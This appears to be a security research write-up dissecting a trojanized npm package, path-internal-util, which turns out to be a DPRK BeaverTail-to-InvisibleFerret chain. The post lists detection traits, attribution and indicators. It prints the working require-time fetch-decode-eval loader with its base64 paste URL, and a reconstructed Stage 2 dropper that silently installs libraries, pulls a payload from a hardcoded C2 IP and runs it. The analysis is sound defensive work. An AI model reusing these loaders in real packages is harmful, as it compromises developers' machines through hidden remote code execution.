---
title: "path-internal-util: don't chase the URL, catch the shape"
date: 2026-06-09
summary: "It's the real Joyent path module, verbatim, plus three lines that fetch a jsonkeeper paste and eval it — pull that thread and it unrolls into a live DPRK BeaverTail loader and a socket.io RAT."
packageName: path-internal-util
ecosystem: npm
---

<img src="/assets/images/path-internal-util-beavertail.jpg" alt="Meme: a close-up of an actual beaver's scaly tail resting on a rock, captioned with the SNL 'More Cowbell' line — 'I've got a fever, and the only prescription is more BEAVER TAIL' — the chain's payload is, in fact, more BeaverTail.">

`path-internal-util` is the Node.js `path` core module — the real one, Joyent's `path.js`, copied byte for byte, 632 lines of working `posix` and `win32` helpers. Three lines were wedged into the middle of it: a base64 string, a `fetch`-decode-`eval` function, and an IIFE that calls it the moment you `require()` the package. The string decodes to a `jsonkeeper.com` paste that hands back arbitrary JavaScript to run. cleave convicts the package on five hostile traits across three subtrees without caring what that URL serves, because the verdict rides on the *shape*: a verbatim core-module clone wrapped around a fetch-eval loader, shipped by a manifest that name-drops a known-bad dependency. That is the point worth keeping — the entry point is caught blind, before anyone fetches anything. We then fetched everything anyway, in a network-isolated VM with every sink stubbed, and the thread unrolled into a live DPRK BeaverTail-to-InvisibleFerret chain: a paste-hosted loader, a numbered dropper, and a socket.io RAT that exfils to a Lazarus endpoint cleave flags by name.

The findings below come from cleave 2.0.0-rc.5, run against the `path-internal-util` 1.0.2 tarball and each recovered stage. Stage 1 was analyzed without execution; stages 2–4 were detonated record-only — no real network, filesystem, or process spawn ever happened.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `path-internal-util` |
| Version | `1.0.2` |
| Description | `Node.js path module` |
| Author | *(empty)* |
| License | `ISC` |
| Main | `./path.js` |
| Dependencies | `axios`, `execp`, `fs@0.0.1-security`, `process`, `request`, `path@0.12.7`, `util` |

## Stage 1 — the require-time loader

The carrier is `path.js` straight from Joyent's Node tree — copyright header intact, every `posix` and `win32` helper present and working. Wedged into it are two globals: an empty `randomStringRe` and a base64 `tokenStringRe`. `tokenStringRe` decodes to `https://www.jsonkeeper.com/b/CWOV9`, a free public JSON paste bin that needs zero setup to stand up. `loadTokenData()` runs `fetch(atob(tokenStringRe)).then(t => t.json()).then(data => eval(data.content))` — fetch the URL, decode it, parse the JSON, run the `content` field. A bare IIFE at the bottom of the file calls it, so `require('path-internal-util')` detonates the `eval` with no trigger, no condition, and no `postinstall` for a lockfile audit to notice. The sibling `loadStringData()` and a `setTimeout(loadTokenData, 5000)` are both commented out — the inert half of a kit template, shipped by reflex.

<pre class="lang-js"><code><span class="tok-kw">var</span> tokenStringRe = <span class="tok-str">"aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9DV09WOQ=="</span>;  <span class="tok-com">// → https://www.jsonkeeper.com/b/CWOV9</span>

<span class="tok-kw">function</span> <span class="tok-fn">loadTokenData</span> () {
  <span class="tok-fn">fetch</span>(<span class="tok-fn">atob</span>(tokenStringRe))
    .<span class="tok-fn">then</span>((t) =&gt; t.<span class="tok-fn">json</span>())
    .<span class="tok-fn">then</span>((data) =&gt; { <span class="tok-fn">eval</span>(data.content); })   <span class="tok-com">// run whatever the paste serves</span>
    .<span class="tok-fn">catch</span>((t) =&gt; console.<span class="tok-fn">error</span>(<span class="tok-str">"Error fetching or executing code:"</span>, t));
}

(<span class="tok-kw">function</span> () {
  <span class="tok-com">// loadStringData();           ← inert sibling, never called; randomStringRe is ""</span>
  <span class="tok-fn">loadTokenData</span>();               <span class="tok-com">// fires at require-time, no condition</span>
  <span class="tok-com">// setTimeout(loadTokenData, 5000)</span>
})();
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/trojanized/library/remote-eval` | verbatim Joyent `path.js` carrying an IIFE that `eval`s a fetched body |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/delivery/fetch-eval` | `fetch(atob(...)).then(t=>t.json()).then(d=>eval(d.content))` to a literal jsonkeeper URL |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/encoded` | base64 string decoded and `eval`'d in the same file |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/impersonation/core-module` | `"description": "Node.js path module"` shipping an `execp` dependency |
| <span class="sev-dot suspicious" title="suspicious"></span> | `well-known/malware/stealer/beaver-tail` | the bare `dependencies.execp` — the Nickel Alley tell |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/dependency/facade` | `execp` and `fs@0.0.1-security` declared but never `require`d |

## Caught by shape, not the URL

Nothing in the Stage 1 verdict touched `CWOV9`. The five hostile traits land in three separate subtrees, and each leg is structural — a property of how the package is built, not a string to blocklist:

- **Impersonation.** The body is a byte-for-byte core module: the Joyent copyright header, `normalizeArray`, `win32SplitPath`, the full `posix`/`win32` export pair. A package shipping the real `path` source verbatim is the anomaly, independent of any payload.
- **Delivery.** `fetch` → `atob` → `.json()` → `eval(data.content)` is a four-link shape. Re-encode the URL, move it to a different paste host, split it across variables — the quartet still matches.
- **Manifest dissonance.** The package calls itself `Node.js path module`, yet of its seven declared dependencies only `util` is ever `require`d; `axios`, `request`, `execp`, `fs`, `process`, and — with a straight face — the real `path` polyfill are pure facade. A manifest that doesn't match its own code is signal on its own.

That is why the next variant survives none of them: a different core module, a different paste service, a freshly rotated `CWOV9` all leave the shape intact. The IOC is disposable; the shape is the case. Everything below is what the disposable IOC happened to be pointing at the day we looked.

## Following the thread

The paste was live. In a record-only sandbox the chain unrolled three stages deep, and cleave convicted each one on its own — the same structural reflex that caught Stage 1 blind.

### Stage 2 — the jsonkeeper BeaverTail loader

`CWOV9` returned 20 KB of obfuscator.io output: a shuffled string array, an RC4-keyed decoder, the `while(!![])` rotation. De-obfuscated, it does four things and nothing else. It silently installs two HTTP libraries into the temp dir with `--no-save` so no manifest changes, beacons a hardcoded IP with a campaign id in the path, writes the reply to `0001.dat`, and runs it with `node`. The install line is byte-identical to [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/)'s Stage 2.

<pre class="lang-js"><code><span class="tok-com">// jsonkeeper CWOV9 → de-obfuscated, reconstructed from recorded sinks</span>
<span class="tok-fn">execSync</span>(<span class="tok-str">"npm install axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent"</span>, { windowsHide: <span class="tok-kw">true</span> });
<span class="tok-fn">require</span>(<span class="tok-str">"axios"</span>).<span class="tok-fn">get</span>(<span class="tok-str">"http://216.126.225.83/api/service/55dfb627190b5091e5164c010d6c5c52"</span>)
  .<span class="tok-fn">then</span>((r) =&gt; { fs.<span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">"0001.dat"</span>), r.data, { flag: <span class="tok-str">"w+"</span> });
                <span class="tok-fn">execSync</span>(<span class="tok-str">"node 0001.dat"</span>, { windowsHide: <span class="tok-kw">true</span> }); });
</code></pre>

### Stage 3 — the numbered dropper

The `/api/service/<uid>` beacon returned 113 KB of the same obfuscator style — almost exactly the size of web-dotenv's 110 KB Stage 3. It is a thin wrapper: it writes a file named `scdata` to the temp dir and `node`-runs it, registering `uncaughtException`/`unhandledRejection` swallowers first so a crash leaves no trace. cleave flags it as a hidden Node dropper without seeing any of the strings.

### Stage 4 — `scdata`, the socket.io RAT

`scdata` is the InvisibleFerret stage: a `socket.io-client` remote-access trojan with `terminal-input`, `terminal-output`, `terminal-resize`, `start_ssh`, and `ssh_input` handlers — an interactive shell and SSH pivot over a persistent C2 socket. It installs `sharp` and `screenshot-desktop` at runtime to capture the screen, renames `process.title`, and drops a pid-lock at `$TMPDIR/.npm/vhost.ctl` to single-instance itself. It tags every packet with the campaign `uid` and `t='104'` — the same telemetry field web-dotenv's clipper stamped as `t:'102'`. Its exfil path is `/api/service/makelog`, which trips cleave's Lazarus `makelog-url` rule outright — the GlassWorm marker, not a generic stealer guess.

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/data-file` | Stage 3: obfuscated data payload that launches a hidden Node child stage |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/remote-command/control` | Stage 4: socket.io RAT — `terminal-output`, `terminal-resize`, remote command execution |
| <span class="sev-dot hostile" title="hostile"></span> | `well-known/malware/dropper/lazarus` | Stage 4: exfil to `/api/service/makelog` — the GlassWorm / Lazarus endpoint signature |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/install-hook/scripts/dynamic-install` | runtime `npm install` of `socket.io-client`, `sharp`, `screenshot-desktop` with stealth flags |
| <span class="sev-dot suspicious" title="suspicious"></span> | `micro-behaviors/communications/ip/literal` | hardcoded `216.126.225.83` C2 |

## The atom that over-promised

One baseline atom misfired on Stage 1 — not on the malice, but on ordinary code, and it earned a fix. `micro-behaviors/data/encode/permutation/loop::js-permutation-loop` advertised "Nested loops with multiple charAt calls," but its regex only matches nested `for` loops; the `charAt` requirement actually lives in a separate composite leg. So it fired on `path.js`'s honest path-normalization loop (`for (; start <= lastIndex; start++)`) and described that as something it never checked. The fix is honesty, not a tighter pattern: the description now reads "Nested for loops (control-flow building block)," and the atom sits at benign severity where it belongs. A description that promises more than the regex delivers is a false-positive generator — the same discipline that makes the true-positive shape trustworthy applies to the building blocks under it. `make validate` stays green: hostile 14/14, benign 9/9, does-nothing 161/161, drop-exec 43/43, reverse-shell 26/26.

## Attribution

This is the DPRK's Contagious Interview campaign — BeaverTail loader into InvisibleFerret RAT — and the recovered chain confirms it at the toolkit level, not on a single name. The `execp` facade dependency was the first hint (Sophos's [Nickel Alley](https://www.sophos.com/en-us/blog/nickel-alley-strategy-fake-it-til-you-make-it) cluster), but the detonated stages are the proof: the loader's `npm install axios socket.io-client …` line, the `/api/service/<hex>` C2 path, the `0001.dat` numbered drop, and the `scdata` stealer with its `uid`/`t=` telemetry are the same kit, code and infrastructure, as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) and [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/) — both attributed to FAMOUS CHOLLIMA via [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). The Stage 3 host `216.126.225.83` sits in the same Tier.Net `216.126.224.0/22` as web-dotenv's `.247` and `.220`. And cleave reaches the verdict unprompted — Stage 4's `/api/service/makelog` exfil trips the Lazarus `makelog-url` rule, a family signature rather than generic stealer noise. This is a new campaign instance (`uid=55dfb627…`, `t='104'`), same operator.

## Indicators

| Type | Value |
| --- | --- |
| Package | `path-internal-util@1.0.2` (npm) |
| npm page | [npmjs.com/package/path-internal-util](https://www.npmjs.com/package/path-internal-util) |
| Tarball SHA-256 | [`7d62ba9c7d79e4cb37a67311866645b88245840d765302bc79286a8e3c0f8a95`](https://lab.atomdrift.org/file/7d62ba9c7d79e4cb37a67311866645b88245840d765302bc79286a8e3c0f8a95) |
| `path.js` SHA-256 | [`98b01dc2b472069106e707749862ea5cfcd1bb2fb339dfeda28047ef1630cbaf`](https://lab.atomdrift.org/file/98b01dc2b472069106e707749862ea5cfcd1bb2fb339dfeda28047ef1630cbaf) |
| Stage 2 URL | `https://www.jsonkeeper.com/b/CWOV9` (base64: `aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9DV09WOQ==`) |
| Stage 2 SHA-256 (snapshot) | [`3d4191faf32641523d277ea8ce36b6fede103e325773f36ab2208e82ed6c9031`](https://lab.atomdrift.org/file/3d4191faf32641523d277ea8ce36b6fede103e325773f36ab2208e82ed6c9031) |
| Stage 3 URL | `http://216.126.225.83/api/service/55dfb627190b5091e5164c010d6c5c52` (Tier.Net, `216.126.224.0/22`) |
| Stage 3 SHA-256 (snapshot) | [`aae780b19c4a99cf4f3a22267bc3020cd03900921e43ad69ae83b7b8ee76e17d`](https://lab.atomdrift.org/file/aae780b19c4a99cf4f3a22267bc3020cd03900921e43ad69ae83b7b8ee76e17d) |
| Stage 4 `scdata` SHA-256 (snapshot) | [`b9fbc752c940f7fcb4ce2ae1a70ed0b4890e9b4818d04e7c6df18102c8a49115`](https://lab.atomdrift.org/file/b9fbc752c940f7fcb4ce2ae1a70ed0b4890e9b4818d04e7c6df18102c8a49115) |
| Dropped files | `$TMPDIR/0001.dat` (Stage 3 loader), `$TMPDIR/scdata` (Stage 4 RAT), `$TMPDIR/.npm/vhost.ctl` (pid lock) |
| Exfil endpoint | `http://216.126.225.83/api/service/makelog` (Lazarus `makelog-url`) |
| Campaign UID | `55dfb627190b5091e5164c010d6c5c52` (telemetry `t='104'`) |
| Facade dependency | `execp` (Nickel Alley / BeaverTail IOC) |
</content>
